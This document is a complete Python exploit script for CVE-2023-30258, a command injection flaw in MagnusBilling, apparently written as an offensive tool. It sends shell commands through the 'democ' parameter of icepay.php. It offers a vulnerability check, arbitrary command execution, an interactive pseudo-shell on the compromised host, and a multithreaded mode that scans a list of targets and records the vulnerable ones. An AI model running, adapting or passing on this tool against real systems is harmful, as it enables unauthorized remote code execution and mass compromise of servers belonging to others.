from colorama import Fore, Style
import requests
import argparse
import sys
import urllib3
import re
import time
from urllib.parse import urlparse
import concurrent.futures
import threading
from queue import Queue
import tqdm

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Thread-safe print lock
print_lock = threading.Lock()

# For tracking progress
progress = {"total": 0, "current": 0, "vulnerable": 0}
progress_lock = threading.Lock()

# Global progress bar reference
global_pbar = None

banner = f"""
{Fore.RED}
  _______ _    _ ______   ___   ___ ___  ____    ____   ___ ___  ___ ___  
 |__   __| |  | |  ____| |__ \ / _ \__ \|___ \  |___ \ / _ \__ \/ _ \__ \ 
    | |  | |__| | |__       ) | | | | ) | __) |   __) | | | | ) | | | | ) |
    | |  |  __  |  __|     / /| | | |/ / |__ <   |__ <| | | |/ /| | | |/ / 
    | |  | |  | | |____   / /_| |_| / /_ ___) |  ___) | |_| / /_| |_| / /_ 
    |_|  |_|  |_|______| |____|\___/____|____/  |____/ \___/____|___/____|
                                                                          
{Fore.YELLOW}MagnusBilling Command Injection Exploit{Fore.RESET}
{Fore.GREEN}Author: {Fore.RESET}c0d3ninja
"""

parser = argparse.ArgumentParser(description="CVE-2023-30258 Exploit for MagnusBilling")
parser.add_argument("-u", "--url", required=False, help="Target URL for exploit mode")
parser.add_argument("-c", "--cmd", required=False, help="Command to execute")
parser.add_argument("-t", "--test", required=False, help="Target URL for test mode")
parser.add_argument("-f", "--file", required=False, help="File containing list of targets")
parser.add_argument("-o", "--output", required=False, help="Output file for vulnerable targets")
parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
parser.add_argument("-s", "--shell", action="store_true", help="Get interactive shell-like experience")
parser.add_argument("-w", "--workers", type=int, default=10, help="Number of concurrent workers (default: 10)")
parser.add_argument("-np", "--no-progress", action="store_true", help="Disable progress bar")
parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode - only show vulnerable targets")
args = parser.parse_args()


def safe_print(message, force=False):
    """Thread-safe print function that respects the progress bar"""
    global global_pbar
    
    with print_lock:
        if global_pbar is not None and not force and not args.quiet:
            # Save current progress bar position
            global_pbar.clear()
            # Print the message
            print(message)
            # Redraw the progress bar
            global_pbar.refresh()
        else:
            # No progress bar or forcing output
            if not args.quiet or force:
                print(message)


def normalize_url(url):
    """Normalize URL format"""
    if url is None:
        return None
        
    url = url.rstrip('/')
    
    # Add https:// if no protocol specified
    if not url.startswith('http://') and not url.startswith('https://'):
        url = f"https://{url}"
        
    return url


def print_verbose(message):
    """Print message only in verbose mode"""
    if args.verbose:
        safe_print(f"{Fore.CYAN}[*] {message}{Fore.RESET}")


def test(url):
    """Test if target is vulnerable to CVE-2023-30258"""
    if url is None:
        safe_print(f"{Fore.RED}[!] Error: URL is required for test mode. Use -t or --test to specify the target.{Fore.RESET}", force=True)
        sys.exit(1)
    
    url = normalize_url(url)
    print_verbose(f"Testing {url} for CVE-2023-30258 vulnerability")
    
    # Multiple potential endpoints to try
    endpoints = [
        "mbilling/lib/icepay/icepay.php?democ=iamhacked;id",
        "mbilling/lib/icepay/icepay.php?democ=;id",
        "mbilling/lib/icepay/icepay.php?democ=test;id"
    ]
    
    for endpoint in endpoints:
        try:
            print_verbose(f"Trying endpoint: {endpoint}")
            r = requests.get(f"{url}/{endpoint}", verify=False, timeout=10)
            
            # Check for common command output patterns
            if "uid=" in r.text or "gid=" in r.text or "www-data" in r.text:
                # Always show vulnerable targets
                safe_print(f"{Fore.GREEN}[+] Target is VULNERABLE: {url}{Fore.RESET}", force=True)
                if args.output:
                    with open(args.output, 'a') as f:
                        f.write(f"{url}\n")
                return True
        except requests.exceptions.RequestException as e:
            if not args.quiet:
                safe_print(f"{Fore.RED}[-] Error connecting to {url}: {str(e)}{Fore.RESET}")
            break
    
    if not args.quiet:
        safe_print(f"{Fore.RED}[-] Target appears not vulnerable: {url}{Fore.RESET}")
    return False


def execute_command(url, cmd):
    """Execute command on vulnerable target and return output"""
    if url is None or cmd is None:
        return None
        
    url = normalize_url(url)
    print_verbose(f"Executing command: {cmd}")
    
    try:
        endpoint = f"mbilling/lib/icepay/icepay.php?democ=;{cmd};#"
        r = requests.get(f"{url}/{endpoint}", verify=False, timeout=15)
        
        output = r.text
        
        # Clean up the output - remove HTML and other noise
        # This is a simple approach and might need refinement based on actual responses
        if "<" in output and ">" in output:
            output = re.sub(r'<[^>]*>', '', output)
        
        return output.strip()
    except requests.exceptions.RequestException as e:
        safe_print(f"{Fore.RED}[-] Error executing command: {str(e)}{Fore.RESET}")
        return None


def exploit(url, cmd):
    """Exploit the vulnerability with a single command"""
    if url is None:
        safe_print(f"{Fore.RED}[!] Error: URL is required. Use -u or --url to specify the target.{Fore.RESET}", force=True)
        sys.exit(1)
    
    if cmd is None:
        safe_print(f"{Fore.RED}[!] Error: Command is required for exploit mode. Use -c or --cmd to specify the command.{Fore.RESET}", force=True)
        sys.exit(1)
    
    url = normalize_url(url)
    
    print_verbose(f"Verifying target vulnerability before exploitation")
    if not test(url):
        safe_print(f"{Fore.RED}[!] Aborting exploitation as target does not appear vulnerable{Fore.RESET}", force=True)
        return
    
    safe_print(f"{Fore.YELLOW}[*] Executing command: {cmd}{Fore.RESET}", force=True)
    output = execute_command(url, cmd)
    
    if output:
        safe_print(f"{Fore.GREEN}[+] Command output:{Fore.RESET}\n{output}", force=True)
    else:
        safe_print(f"{Fore.RED}[-] No output received or command failed{Fore.RESET}", force=True)


def interactive_shell(url):
    """Provide an interactive shell-like experience"""
    if url is None:
        safe_print(f"{Fore.RED}[!] Error: URL is required for shell mode.{Fore.RESET}", force=True)
        sys.exit(1)
    
    url = normalize_url(url)
    
    print_verbose(f"Verifying target vulnerability before starting shell")
    if not test(url):
        safe_print(f"{Fore.RED}[!] Aborting shell as target does not appear vulnerable{Fore.RESET}", force=True)
        return
    
    hostname = execute_command(url, "hostname")
    whoami = execute_command(url, "whoami")
    pwd = execute_command(url, "pwd")
    
    safe_print(f"{Fore.GREEN}[+] Connected to {hostname} as {whoami}{Fore.RESET}", force=True)
    safe_print(f"{Fore.YELLOW}[*] Type 'exit' or 'quit' to exit the shell{Fore.RESET}", force=True)
    
    while True:
        try:
            cmd = input(f"{Fore.GREEN}{whoami}@{hostname}{Fore.RESET}:{Fore.BLUE}{pwd}{Fore.RESET}$ ")
            
            if cmd.lower() in ['exit', 'quit']:
                safe_print(f"{Fore.YELLOW}[*] Exiting shell{Fore.RESET}", force=True)
                break
                
            if cmd.strip() == '':
                continue
                
            if cmd.startswith('cd '):
                new_dir = cmd[3:].strip()
                if new_dir.startswith('/'):
                    pwd = new_dir
                else:
                    pwd = execute_command(url, f"cd {pwd} && cd {new_dir} && pwd")
                continue
                
            output = execute_command(url, cmd)
            if output:
                print(output)
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Interrupted. Type 'exit' to quit.{Fore.RESET}")
        except Exception as e:
            safe_print(f"{Fore.RED}[-] Error: {str(e)}{Fore.RESET}", force=True)


def test_target_worker(target, pbar=None):
    """Worker function for testing a single target in a thread"""
    with progress_lock:
        progress["current"] += 1
        current = progress["current"]
        total = progress["total"]
    
    if pbar is None and not args.no_progress and not args.quiet:
        safe_print(f"{Fore.YELLOW}[*] Testing target [{current}/{total}]: {target}{Fore.RESET}")
    
    result = test(target)
    
    if result:
        with progress_lock:
            progress["vulnerable"] += 1
            
    if pbar is not None:
        pbar.update(1)
        with progress_lock:
            pbar.set_description(f"Scanning ({progress['vulnerable']} vulnerable)")
    
    return result


def process_file_concurrent(file_path):
    """Process a file containing multiple targets using concurrency"""
    global global_pbar
    
    if not file_path:
        safe_print(f"{Fore.RED}[!] Error: File path is required{Fore.RESET}", force=True)
        return
        
    try:
        with open(file_path, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        with progress_lock:
            progress["total"] = len(targets)
            progress["current"] = 0
            progress["vulnerable"] = 0
            
        safe_print(f"{Fore.YELLOW}[*] Loaded {len(targets)} targets from {file_path}{Fore.RESET}", force=True)
        safe_print(f"{Fore.YELLOW}[*] Starting scan with {args.workers} concurrent workers{Fore.RESET}", force=True)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
            if not args.no_progress:
                with tqdm.tqdm(total=len(targets), desc="Scanning (0 vulnerable)", 
                              bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]",
                              position=0, leave=True) as pbar:
                    global_pbar = pbar
                    
                    futures = {executor.submit(test_target_worker, target, pbar): target for target in targets}
                    
                    for future in concurrent.futures.as_completed(futures):
                        target = futures[future]
                        try:
                            future.result()
                        except Exception as e:
                            safe_print(f"{Fore.RED}[-] Error processing {target}: {str(e)}{Fore.RESET}")
                    
                    global_pbar = None
            else:
                futures = {executor.submit(test_target_worker, target): target for target in targets}
                for future in concurrent.futures.as_completed(futures):
                    target = futures[future]
                    try:
                        future.result()
                    except Exception as e:
                        safe_print(f"{Fore.RED}[-] Error processing {target}: {str(e)}{Fore.RESET}")
        
        safe_print(f"{Fore.GREEN}[+] Scan complete! Found {progress['vulnerable']} vulnerable targets out of {len(targets)}{Fore.RESET}", force=True)
        
    except Exception as e:
        safe_print(f"{Fore.RED}[!] Error processing file: {str(e)}{Fore.RESET}", force=True)


def process_file(file_path):
    """Process a file containing multiple targets"""
    # Use the concurrent version
    process_file_concurrent(file_path)


def main():
    print(banner)
    
    # Check if tqdm is installed
    try:
        import tqdm
    except ImportError:
        safe_print(f"{Fore.YELLOW}[!] Warning: tqdm module not found. Progress bar will be disabled.{Fore.RESET}", force=True)
        safe_print(f"{Fore.YELLOW}[!] Install it with: pip install tqdm{Fore.RESET}", force=True)
        args.no_progress = True
    
    if args.file:
        process_file(args.file)
        return
        
    if args.shell:
        target = args.url or args.test
        interactive_shell(target)
        return
        
    if args.test:
        test(args.test)
        return

    exploit(args.url, args.cmd)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        safe_print(f"\n{Fore.YELLOW}[*] Operation interrupted by user{Fore.RESET}", force=True)
        sys.exit(0)
    except Exception as e:
        safe_print(f"{Fore.RED}[!] Unhandled error: {str(e)}{Fore.RESET}", force=True)
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)
    